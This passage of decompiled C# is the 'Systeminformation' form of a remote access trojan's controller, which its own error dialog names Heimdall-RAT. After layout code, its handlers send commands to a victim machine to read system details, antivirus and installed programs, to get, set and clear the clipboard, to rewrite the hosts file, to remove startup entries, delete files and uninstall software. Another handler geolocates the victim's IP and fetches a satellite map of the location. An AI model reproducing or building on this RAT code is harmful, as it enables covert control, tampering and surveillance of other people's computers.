		TabPage7.set_ImageKey("pcinf.png");
		TabPage tabPage19 = TabPage7;
		location = new Point(154, 4);
		tabPage19.set_Location(location);
		((Control)TabPage7).set_Name("TabPage7");
		TabPage tabPage20 = TabPage7;
		((Padding)(ref padding))._002Ector(3);
		((Control)tabPage20).set_Padding(padding);
		TabPage tabPage21 = TabPage7;
		size = new Size(889, 458);
		((Control)tabPage21).set_Size(size);
		TabPage7.set_TabIndex(6);
		TabPage7.set_Text("Startup Control");
		TabPage7.set_UseVisualStyleBackColor(true);
		((Control)TabControl1).get_Controls().Add((Control)(object)TabPage9);
		((Control)TabControl1).get_Controls().Add((Control)(object)TabPage10);
		((Control)TabControl1).set_Dock((DockStyle)5);
		((Control)TabControl1).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		TabControl tabControl = TabControl1;
		location = new Point(3, 3);
		((Control)tabControl).set_Location(location);
		((Control)TabControl1).set_Name("TabControl1");
		TabControl1.set_SelectedIndex(0);
		TabControl tabControl2 = TabControl1;
		size = new Size(883, 452);
		((Control)tabControl2).set_Size(size);
		((Control)TabControl1).set_TabIndex(0);
		((Control)TabPage9).get_Controls().Add((Control)(object)ListView4);
		((Control)TabPage9).get_Controls().Add((Control)(object)StatusStrip7);
		TabPage tabPage22 = TabPage9;
		location = new Point(4, 24);
		tabPage22.set_Location(location);
		((Control)TabPage9).set_Name("TabPage9");
		TabPage tabPage23 = TabPage9;
		((Padding)(ref padding))._002Ector(3);
		((Control)tabPage23).set_Padding(padding);
		TabPage tabPage24 = TabPage9;
		size = new Size(875, 424);
		((Control)tabPage24).set_Size(size);
		TabPage9.set_TabIndex(0);
		TabPage9.set_Text("Registry Startup");
		TabPage9.set_UseVisualStyleBackColor(true);
		ListView4.get_Columns().AddRange((ColumnHeader[])(object)new ColumnHeader[2] { ColumnHeader14, ColumnHeader15 });
		((Control)ListView4).set_ContextMenuStrip(ContextMenuStrip4);
		((Control)ListView4).set_Dock((DockStyle)5);
		((Control)ListView4).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		ListView4.set_FullRowSelect(true);
		ListView4.set_GridLines(true);
		ListView listView7 = ListView4;
		location = new Point(3, 3);
		((Control)listView7).set_Location(location);
		((Control)ListView4).set_Name("ListView4");
		ListView listView8 = ListView4;
		size = new Size(869, 396);
		((Control)listView8).set_Size(size);
		ListView4.set_SmallImageList(ImageList6);
		((Control)ListView4).set_TabIndex(1);
		ListView4.set_UseCompatibleStateImageBehavior(false);
		ListView4.set_View((View)1);
		ColumnHeader14.set_Text("Display Name");
		ColumnHeader14.set_Width(105);
		ColumnHeader15.set_Text("Command");
		ColumnHeader15.set_Width(81);
		((ToolStrip)StatusStrip7).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[1] { (ToolStripItem)ToolStripStatusLabel7 });
		StatusStrip statusStrip11 = StatusStrip7;
		location = new Point(3, 399);
		((Control)statusStrip11).set_Location(location);
		((Control)StatusStrip7).set_Name("StatusStrip7");
		StatusStrip statusStrip12 = StatusStrip7;
		size = new Size(869, 22);
		((Control)statusStrip12).set_Size(size);
		((Control)StatusStrip7).set_TabIndex(0);
		((Control)StatusStrip7).set_Text("StatusStrip7");
		((ToolStripItem)ToolStripStatusLabel7).set_Name("ToolStripStatusLabel7");
		ToolStripStatusLabel toolStripStatusLabel6 = ToolStripStatusLabel7;
		size = new Size(139, 17);
		((ToolStripItem)toolStripStatusLabel6).set_Size(size);
		((ToolStripItem)ToolStripStatusLabel7).set_Text("Ready to any command !");
		((Control)TabPage10).get_Controls().Add((Control)(object)StatusStrip8);
		((Control)TabPage10).get_Controls().Add((Control)(object)ListView5);
		TabPage tabPage25 = TabPage10;
		location = new Point(4, 24);
		tabPage25.set_Location(location);
		((Control)TabPage10).set_Name("TabPage10");
		TabPage tabPage26 = TabPage10;
		((Padding)(ref padding))._002Ector(3);
		((Control)tabPage26).set_Padding(padding);
		TabPage tabPage27 = TabPage10;
		size = new Size(875, 424);
		((Control)tabPage27).set_Size(size);
		TabPage10.set_TabIndex(1);
		TabPage10.set_Text("Startup Folder");
		TabPage10.set_UseVisualStyleBackColor(true);
		((ToolStrip)StatusStrip8).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[1] { (ToolStripItem)ToolStripStatusLabel8 });
		StatusStrip statusStrip13 = StatusStrip8;
		location = new Point(3, 399);
		((Control)statusStrip13).set_Location(location);
		((Control)StatusStrip8).set_Name("StatusStrip8");
		StatusStrip statusStrip14 = StatusStrip8;
		size = new Size(869, 22);
		((Control)statusStrip14).set_Size(size);
		((Control)StatusStrip8).set_TabIndex(3);
		((Control)StatusStrip8).set_Text("StatusStrip8");
		((ToolStripItem)ToolStripStatusLabel8).set_Name("ToolStripStatusLabel8");
		ToolStripStatusLabel toolStripStatusLabel7 = ToolStripStatusLabel8;
		size = new Size(139, 17);
		((ToolStripItem)toolStripStatusLabel7).set_Size(size);
		((ToolStripItem)ToolStripStatusLabel8).set_Text("Ready to any command !");
		((Control)ListView5).set_Anchor((AnchorStyles)15);
		ListView5.get_Columns().AddRange((ColumnHeader[])(object)new ColumnHeader[1] { ColumnHeader18 });
		((Control)ListView5).set_ContextMenuStrip(ContextMenuStrip5);
		((Control)ListView5).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		ListView5.set_FullRowSelect(true);
		ListView5.set_GridLines(true);
		ListView listView9 = ListView5;
		location = new Point(3, 3);
		((Control)listView9).set_Location(location);
		ListView5.set_MultiSelect(false);
		((Control)ListView5).set_Name("ListView5");
		ListView listView10 = ListView5;
		size = new Size(866, 393);
		((Control)listView10).set_Size(size);
		ListView5.set_SmallImageList(ImageList6);
		ListView5.set_Sorting((SortOrder)1);
		((Control)ListView5).set_TabIndex(2);
		ListView5.set_UseCompatibleStateImageBehavior(false);
		ListView5.set_View((View)1);
		ColumnHeader18.set_Text("Display Name");
		ColumnHeader18.set_Width(691);
		((Control)TabPage8).get_Controls().Add((Control)(object)HostsText);
		((Control)TabPage8).get_Controls().Add((Control)(object)StatusStrip6);
		TabPage8.set_ImageKey("pcinf.png");
		TabPage tabPage28 = TabPage8;
		location = new Point(154, 4);
		tabPage28.set_Location(location);
		((Control)TabPage8).set_Name("TabPage8");
		TabPage tabPage29 = TabPage8;
		((Padding)(ref padding))._002Ector(3);
		((Control)tabPage29).set_Padding(padding);
		TabPage tabPage30 = TabPage8;
		size = new Size(889, 458);
		((Control)tabPage30).set_Size(size);
		TabPage8.set_TabIndex(7);
		TabPage8.set_Text("Hosts File");
		TabPage8.set_UseVisualStyleBackColor(true);
		((Control)HostsText).set_ContextMenuStrip(ContextMenuStrip3);
		((Control)HostsText).set_Dock((DockStyle)5);
		((Control)HostsText).set_Font(new Font("Verdana", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		TextBox hostsText = HostsText;
		location = new Point(3, 3);
		((Control)hostsText).set_Location(location);
		HostsText.set_Multiline(true);
		((Control)HostsText).set_Name("HostsText");
		TextBox hostsText2 = HostsText;
		size = new Size(883, 430);
		((Control)hostsText2).set_Size(size);
		((Control)HostsText).set_TabIndex(1);
		((ToolStrip)StatusStrip6).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[1] { (ToolStripItem)ToolStripStatusLabel6 });
		StatusStrip statusStrip15 = StatusStrip6;
		location = new Point(3, 433);
		((Control)statusStrip15).set_Location(location);
		((Control)StatusStrip6).set_Name("StatusStrip6");
		StatusStrip statusStrip16 = StatusStrip6;
		size = new Size(883, 22);
		((Control)statusStrip16).set_Size(size);
		((Control)StatusStrip6).set_TabIndex(0);
		((Control)StatusStrip6).set_Text("StatusStrip6");
		((ToolStripItem)ToolStripStatusLabel6).set_Name("ToolStripStatusLabel6");
		ToolStripStatusLabel toolStripStatusLabel8 = ToolStripStatusLabel6;
		size = new Size(139, 17);
		((ToolStripItem)toolStripStatusLabel8).set_Size(size);
		((ToolStripItem)ToolStripStatusLabel6).set_Text("Ready to any command !");
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(1047, 466);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)EtherealTabControl1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("SystemInfGR");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("Systeminformation");
		((Control)ContextMenuStrip1).ResumeLayout(false);
		((Control)ContextMenuStrip2).ResumeLayout(false);
		((Control)ContextMenuStrip4).ResumeLayout(false);
		((Control)ContextMenuStrip5).ResumeLayout(false);
		((Control)ContextMenuStrip3).ResumeLayout(false);
		((Control)EtherealTabControl1).ResumeLayout(false);
		((Control)TabPage1).ResumeLayout(false);
		((Control)TabPage1).PerformLayout();
		((Control)Panel1).ResumeLayout(false);
		((Control)StatusStrip1).ResumeLayout(false);
		((Control)StatusStrip1).PerformLayout();
		((Control)TabPage2).ResumeLayout(false);
		((ISupportInitialize)PM).EndInit();
		((Control)Panel5).ResumeLayout(false);
		((Control)Panel4).ResumeLayout(false);
		((Control)TabPage3).ResumeLayout(false);
		((Control)TabPage3).PerformLayout();
		((Control)Panel3).ResumeLayout(false);
		((Control)StatusStrip4).ResumeLayout(false);
		((Control)StatusStrip4).PerformLayout();
		((Control)TabPage4).ResumeLayout(false);
		((Control)TabPage4).PerformLayout();
		((Control)StatusStrip3).ResumeLayout(false);
		((Control)StatusStrip3).PerformLayout();
		((Control)TabPage5).ResumeLayout(false);
		((Control)TabPage5).PerformLayout();
		((Control)StatusStrip5).ResumeLayout(false);
		((Control)StatusStrip5).PerformLayout();
		((Control)TabPage6).ResumeLayout(false);
		((Control)TabPage6).PerformLayout();
		((Control)Panel2).ResumeLayout(false);
		((Control)StatusStrip2).ResumeLayout(false);
		((Control)StatusStrip2).PerformLayout();
		((Control)TabPage7).ResumeLayout(false);
		((Control)TabControl1).ResumeLayout(false);
		((Control)TabPage9).ResumeLayout(false);
		((Control)TabPage9).PerformLayout();
		((Control)StatusStrip7).ResumeLayout(false);
		((Control)StatusStrip7).PerformLayout();
		((Control)TabPage10).ResumeLayout(false);
		((Control)TabPage10).PerformLayout();
		((Control)StatusStrip8).ResumeLayout(false);
		((Control)StatusStrip8).PerformLayout();
		((Control)TabPage8).ResumeLayout(false);
		((Control)TabPage8).PerformLayout();
		((Control)StatusStrip6).ResumeLayout(false);
		((Control)StatusStrip6).PerformLayout();
		((Control)this).ResumeLayout(false);
	}

	private void Systeminformation_Load(object sender, EventArgs e)
	{
		Document = new XmlDocument();
	}

	private void refpcinf_Click(object sender, EventArgs e)
	{
		try
		{
			ListView1.get_Items().Clear();
			((ToolStripItem)ToolStripStatusLabel1).set_Text("Please wait a moment ...");
			MyProject.Forms.FrmMAINGR.s.Send(sock, "System Detils");
			((Control)refpcinf).set_Enabled(false);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void clearpcinf_Click(object sender, EventArgs e)
	{
		try
		{
			ListView1.get_Items().Clear();
			((ToolStripItem)ToolStripStatusLabel1).set_Text("..");
			((Control)clearpcinf).set_Enabled(false);
			((Control)refpcinf).set_Enabled(true);
			((Control)ListView1).set_Enabled(false);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void ListView1_DrawSubItem(object sender, DrawListViewSubItemEventArgs e)
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected O, but got Unknown
		//IL_0042: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_008e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0095: Expected O, but got Unknown
		SolidBrush val = new SolidBrush(e.get_SubItem().get_ForeColor());
		try
		{
			if (ListView1.get_SelectedIndices().Contains(e.get_ItemIndex()) & ((Control)ListView1).get_Focused())
			{
				e.get_Graphics().FillRectangle((Brush)new SolidBrush(Color.FromKnownColor(KnownColor.Highlight)), e.get_Bounds());
				val.set_Color(Color.White);
			}
			if (ListView1.get_Items().get_Item(11).get_SubItems()
				.get_Item(1) == e.get_SubItem())
			{
				e.set_DrawDefault(false);
				StringFormat val2 = new StringFormat();
				val2.set_Alignment((StringAlignment)0);
				val2.set_LineAlignment((StringAlignment)1);
				val2.set_FormatFlags((StringFormatFlags)4096);
				val2.set_Trimming((StringTrimming)3);
				StringFormat val3 = val2;
				try
				{
					int valuelah = Valuelah;
					if ((valuelah >= 1 && valuelah <= 25) ? true : false)
					{
						e.get_Graphics().DrawImage(ImageList2.get_Images().get_Item(10), e.get_Bounds().X, e.get_Bounds().Y, e.get_Bounds().Height, e.get_Bounds().Height);
					}
					else if ((valuelah >= 25 && valuelah <= 50) ? true : false)
					{
						e.get_Graphics().DrawImage(ImageList2.get_Images().get_Item(9), e.get_Bounds().X, e.get_Bounds().Y, e.get_Bounds().Height, e.get_Bounds().Height);
					}
					else if ((valuelah >= 50 && valuelah <= 75) ? true : false)
					{
						e.get_Graphics().DrawImage(ImageList2.get_Images().get_Item(8), e.get_Bounds().X, e.get_Bounds().Y, e.get_Bounds().Height, e.get_Bounds().Height);
					}
					else if ((valuelah >= 75 && valuelah <= 100) ? true : false)
					{
						e.get_Graphics().DrawImage(ImageList2.get_Images().get_Item(7), e.get_Bounds().X, e.get_Bounds().Y, e.get_Bounds().Height, e.get_Bounds().Height);
					}
					else
					{
						e.get_Graphics().DrawImage(ImageList2.get_Images().get_Item(249), e.get_Bounds().X, e.get_Bounds().Y, e.get_Bounds().Height, e.get_Bounds().Height);
					}
					Rectangle rectangle = checked(new Rectangle(e.get_Bounds().X + e.get_Bounds().Height, e.get_Bounds().Y, e.get_Bounds().Width - e.get_Bounds().Height, e.get_Bounds().Height));
					e.get_Graphics().DrawString(e.get_SubItem().get_Text(), e.get_SubItem().get_Font(), (Brush)(object)val, (RectangleF)rectangle, val3);
					return;
				}
				finally
				{
				}
			}
			e.set_DrawDefault(true);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Button2_Click(object sender, EventArgs e)
	{
		try
		{
			((Control)RWL).set_Enabled(false);
			MyProject.Forms.FrmMAINGR.s.Send(sock, "GWL");
			((ToolStripItem)ToolStripStatusLabel2).set_Text("Please wait a moment ...");
			((Control)CWL).set_Enabled(true);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void CWL_Click(object sender, EventArgs e)
	{
		try
		{
			((Control)RWL).set_Enabled(true);
			((Control)CWL).set_Enabled(false);
			WIL.get_Items().Clear();
			((Control)WIL).set_Enabled(false);
			((ToolStripItem)ToolStripStatusLabel2).set_Text("Ready to any command!");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void RefreshToolStripMenuItem_Click(object sender, EventArgs e)
	{
		((Control)ListView2).set_Enabled(false);
		ListView2.get_Items().Clear();
		MyProject.Forms.FrmMAINGR.s.Send(sock, "Getinstalledprograms" + MyProject.Forms.FrmMAINGR.Key);
		((ToolStripItem)ToolStripStatusLabel3).set_Text("Please wait a moment ...");
	}

	private void UninstallToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = ListView2.get_SelectedItems().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					MyProject.Forms.FrmMAINGR.s.Send(sock, "Uninstall" + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(val.get_SubItems().get_Item(4).get_Text()));
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void AVRE_Click(object sender, EventArgs e)
	{
		AVLIST.get_Items().Clear();
		AVLIST.get_Groups().Clear();
		((ToolStripItem)ToolStripStatusLabel4).set_Text("Please wait a moment ...");
		((Control)AVRE).set_Enabled(false);
		((Control)AVLIST).set_Enabled(false);
		MyProject.Forms.FrmMAINGR.s.Send(sock, "GAVN");
	}

	private void CAVLIST_Click(object sender, EventArgs e)
	{
		AVLIST.get_Items().Clear();
		AVLIST.get_Groups().Clear();
		((ToolStripItem)ToolStripStatusLabel4).set_Text("Ready to any command!");
		((Control)AVRE).set_Enabled(true);
		((Control)CAVLIST).set_Enabled(false);
		((Control)AVLIST).set_Enabled(false);
	}

	private void ToolStripMenuItem3_Click(object sender, EventArgs e)
	{
		MyProject.Forms.FrmMAINGR.s.Send(sock, "ClearClipboard");
		Textc.set_Text("");
	}

	private void ToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		MyProject.Forms.FrmMAINGR.s.Send(sock, "GetClipboard");
		((ToolStripItem)ToolStripStatusLabel5).set_Text("Please wait a moment ...");
	}

	private void ToolStripMenuItem2_Click(object sender, EventArgs e)
	{
		string input = Interaction.InputBox("Enter the text you want set in clipboard!", "", "Heimdall", -1, -1);
		MyProject.Forms.FrmMAINGR.s.Send(sock, "SetClipboard" + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(input));
		MyProject.Forms.FrmMAINGR.s.Send(sock, "GetClipboard");
	}

	private void ToolStripMenuItem4_Click(object sender, EventArgs e)
	{
		if (((Control)HostsText).get_Enabled())
		{
			HostsText.set_Text("");
			((Control)HostsText).set_Enabled(false);
		}
		MyProject.Forms.FrmMAINGR.s.Send(sock, "ReadHostsFile");
		((ToolStripItem)ToolStripStatusLabel6).set_Text("Please wait a moment ...");
	}

	private void ToolStripMenuItem5_Click(object sender, EventArgs e)
	{
		MyProject.Forms.FrmMAINGR.s.Send(sock, "UpdateHostFile" + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(HostsText.get_Text()));
		((ToolStripItem)ToolStripStatusLabel6).set_Text("Host file updated successfully");
	}

	private void ToolStripMenuItem6_Click(object sender, EventArgs e)
	{
		if (((Control)HostsText).get_Enabled())
		{
			HostsText.set_Text("");
			((ToolStripItem)ToolStripStatusLabel6).set_Text("Ready to any command !");
		}
	}

	public string GDESN(string input)
	{
		return Document.DocumentElement!.SelectSingleNode(input)!.InnerText;
	}

	private void RFM_Click(object sender, EventArgs e)
	{
		//IL_058d: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			((Control)RFM).set_Enabled(false);
			PM.set_Image((Image)null);
			Document.LoadXml(new WebClient().DownloadString("http://ip-api.com/xml/" + MyProject.Forms.FrmMAINGR.s.IP(ref sock)));
			File.WriteAllBytes(Path.GetTempPath() + "Heimdall-Clients-Map.jpg", new WebClient().DownloadData("http://maps.google.com/maps/api/staticmap?center=" + GDESN("lat") + "," + GDESN("lon") + "&zoom=2&markers=color:red|" + GDESN("lat") + "," + GDESN("lon") + "&size=" + ((Form)this).get_Size().Width + "x" + ((Form)this).get_Size().Height + "&maptype=satellite&sensor=false"));
			PM.set_ImageLocation(Path.GetTempPath() + "Heimdall-Clients-Map.jpg");
			try
			{
				ListView3.get_Items().get_Item(0).get_SubItems()
					.get_Item(1)
					.set_Text(GDESN("country").ToString());
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ListView3.get_Items().get_Item(0).get_SubItems()
					.get_Item(1)
					.set_Text("????");
				ProjectData.ClearProjectError();
			}
			try
			{
				ListView3.get_Items().get_Item(1).get_SubItems()
					.get_Item(1)
					.set_Text(GDESN("countryCode").ToString());
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ListView3.get_Items().get_Item(1).get_SubItems()
					.get_Item(1)
					.set_Text("????");
				ProjectData.ClearProjectError();
			}
			try
			{
				ListView3.get_Items().get_Item(2).get_SubItems()
					.get_Item(1)
					.set_Text(GDESN("region").ToString());
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ListView3.get_Items().get_Item(2).get_SubItems()
					.get_Item(1)
					.set_Text("????");
				ProjectData.ClearProjectError();
			}
			try
			{
				ListView3.get_Items().get_Item(3).get_SubItems()
					.get_Item(1)
					.set_Text(GDESN("regionName").ToString());
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				ListView3.get_Items().get_Item(3).get_SubItems()
					.get_Item(1)
					.set_Text("????");
				ProjectData.ClearProjectError();
			}
			try
			{
				ListView3.get_Items().get_Item(4).get_SubItems()
					.get_Item(1)
					.set_Text(GDESN("city").ToString());
			}
			catch (Exception projectError5)
			{
				ProjectData.SetProjectError(projectError5);
				ListView3.get_Items().get_Item(4).get_SubItems()
					.get_Item(1)
					.set_Text("????");
				ProjectData.ClearProjectError();
			}
			try
			{
				ListView3.get_Items().get_Item(4).get_SubItems()
					.get_Item(1)
					.set_Text(GDESN("city").ToString());
			}
			catch (Exception projectError6)
			{
				ProjectData.SetProjectError(projectError6);
				ListView3.get_Items().get_Item(4).get_SubItems()
					.get_Item(1)
					.set_Text("????");
				ProjectData.ClearProjectError();
			}
			try
			{
				ListView3.get_Items().get_Item(5).get_SubItems()
					.get_Item(1)
					.set_Text(GDESN("lat").ToString());
			}
			catch (Exception projectError7)
			{
				ProjectData.SetProjectError(projectError7);
				ListView3.get_Items().get_Item(5).get_SubItems()
					.get_Item(1)
					.set_Text("????");
				ProjectData.ClearProjectError();
			}
			try
			{
				ListView3.get_Items().get_Item(6).get_SubItems()
					.get_Item(1)
					.set_Text(GDESN("lon").ToString());
			}
			catch (Exception projectError8)
			{
				ProjectData.SetProjectError(projectError8);
				ListView3.get_Items().get_Item(6).get_SubItems()
					.get_Item(1)
					.set_Text("????");
				ProjectData.ClearProjectError();
			}
			try
			{
				ListView3.get_Items().get_Item(7).get_SubItems()
					.get_Item(1)
					.set_Text(GDESN("timezone").ToString());
			}
			catch (Exception projectError9)
			{
				ProjectData.SetProjectError(projectError9);
				ListView3.get_Items().get_Item(7).get_SubItems()
					.get_Item(1)
					.set_Text("????");
				ProjectData.ClearProjectError();
			}
			try
			{
				ListView3.get_Items().get_Item(8).get_SubItems()
					.get_Item(1)
					.set_Text(MyProject.Forms.FrmMAINGR.s.IP(ref sock).ToString());
			}
			catch (Exception projectError10)
			{
				ProjectData.SetProjectError(projectError10);
				ListView3.get_Items().get_Item(8).get_SubItems()
					.get_Item(1)
					.set_Text("????");
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.Message.ToString(), "Heimdall-RAT ", (MessageBoxButtons)0, (MessageBoxIcon)16);
			ProjectData.ClearProjectError();
		}
		((Control)RFM).set_Enabled(true);
		((Control)PM).Refresh();
	}

	private void ToolStripMenuItem7_Click(object sender, EventArgs e)
	{
		ListView5.get_Items().Clear();
		((Control)ListView5).set_Enabled(false);
		MyProject.Forms.FrmMAINGR.s.Send(sock, "GetStartupFiles");
		((ToolStripItem)ToolStripStatusLabel8).set_Text("Please wait a moment ...");
	}

	private void ToolStripMenuItem8_Click(object sender, EventArgs e)
	{
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0030: Expected O, but got Unknown
		((ToolStripItem)ToolStripStatusLabel8).set_Text("Please wait a moment ...");
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = ListView5.get_SelectedItems().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					MyProject.Forms.FrmMAINGR.s.Send(sock, "DFile" + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(val.get_SubItems().get_Item(0).get_Text()));
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void RefreshToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		ListView4.get_Items().Clear();
		((Control)ListView4).set_Enabled(false);
		MyProject.Forms.FrmMAINGR.s.Send(sock, "GSV");
		((ToolStripItem)ToolStripStatusLabel7).set_Text("Please wait a moment ...");
	}

	private void RemoveToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0030: Expected O, but got Unknown
		((ToolStripItem)ToolStripStatusLabel7).set_Text("Please wait a moment ...");
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = ListView4.get_SelectedItems().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					MyProject.Forms.FrmMAINGR.s.Send(sock, "RReg" + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(val.get_SubItems().get_Item(0).get_Text()));
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void ListView4_ColumnClick(object sender, ColumnClickEventArgs e)
	{
		//IL_0050: Unknown result type (might be due to invalid IL or missing references)
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_0099: Unknown result type (might be due to invalid IL or missing references)
		//IL_009d: Unknown result type (might be due to invalid IL or missing references)
		//IL_00df: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e1: Invalid comparison between Unknown and I4
		//IL_0133: Unknown result type (might be due to invalid IL or missing references)
		if (Conversions.ToDouble(ListView4.get_Items().get_Count().ToString()) != 0.0)
		{
			ColumnHeader val = ListView4.get_Columns().get_Item(e.get_Column());
			SortOrder val2;
			if (m_SortingColumn == null)
			{
				val2 = (SortOrder)1;
			}
			else
			{
				val2 = ((!((object)val).Equals((object?)m_SortingColumn)) ? ((SortOrder)1) : ((!Conversions.ToBoolean(NewLateBinding.LateGet(m_SortingColumn.get_Tag(), (Type)null, "StartsWith", new object[1] { "> " }, (string[])null, (Type[])null, (bool[])null))) ? ((SortOrder)1) : ((SortOrder)2)));
				m_SortingColumn.set_Tag(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(m_SortingColumn.get_Tag(), (Type)null, "Substring", new object[1] { 2 }, (string[])null, (Type[])null, (bool[])null)));
			}
			m_SortingColumn = val;
			if ((int)val2 == 1)
			{
				m_SortingColumn.set_Tag(Operators.ConcatenateObject((object)"> ", m_SortingColumn.get_Tag()));
			}
			else
			{
				m_SortingColumn.set_Tag(Operators.ConcatenateObject((object)"< ", m_SortingColumn.get_Tag()));
			}
			ListView4.set_ListViewItemSorter((IComparer)new ListViewItemComparer(e.get_Column(), val2));
			ListView4.Sort();
		}
	}

	private void ListView2_ColumnClick(object sender, ColumnClickEventArgs e)
	{
		//IL_0050: Unknown result type (might be due to invalid IL or missing references)
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_0099: Unknown result type (might be due to invalid IL or missing references)
		//IL_009d: Unknown result type (might be due to invalid IL or missing references)
		//IL_00df: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e1: Invalid comparison between Unknown and I4
		//IL_0133: Unknown result type (might be due to invalid IL or missing references)
		if (Conversions.ToDouble(ListView2.get_Items().get_Count().ToString()) != 0.0)
		{
			ColumnHeader val = ListView2.get_Columns().get_Item(e.get_Column());
			SortOrder val2;
			if (m_SortingColumn == null)
			{
				val2 = (SortOrder)1;
			}
			else
			{
				val2 = ((!((object)val).Equals((object?)m_SortingColumn)) ? ((SortOrder)1) : ((!Conversions.ToBoolean(NewLateBinding.LateGet(m_SortingColumn.get_Tag(), (Type)null, "StartsWith", new object[1] { "> " }, (string[])null, (Type[])null, (bool[])null))) ? ((SortOrder)1) : ((SortOrder)2)));
				m_SortingColumn.set_Tag(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(m_SortingColumn.get_Tag(), (Type)null, "Substring", new object[1] { 2 }, (string[])null, (Type[])null, (bool[])null)));
			}
			m_SortingColumn = val;
			if ((int)val2 == 1)
			{
				m_SortingColumn.set_Tag(Operators.ConcatenateObject((object)"> ", m_SortingColumn.get_Tag()));
			}
			else
			{
				m_SortingColumn.set_Tag(Operators.ConcatenateObject((object)"< ", m_SortingColumn.get_Tag()));
			}
			ListView2.set_ListViewItemSorter((IComparer)new ListViewItemComparer(e.get_Column(), val2));
			ListView2.Sort();
		}
	}
}
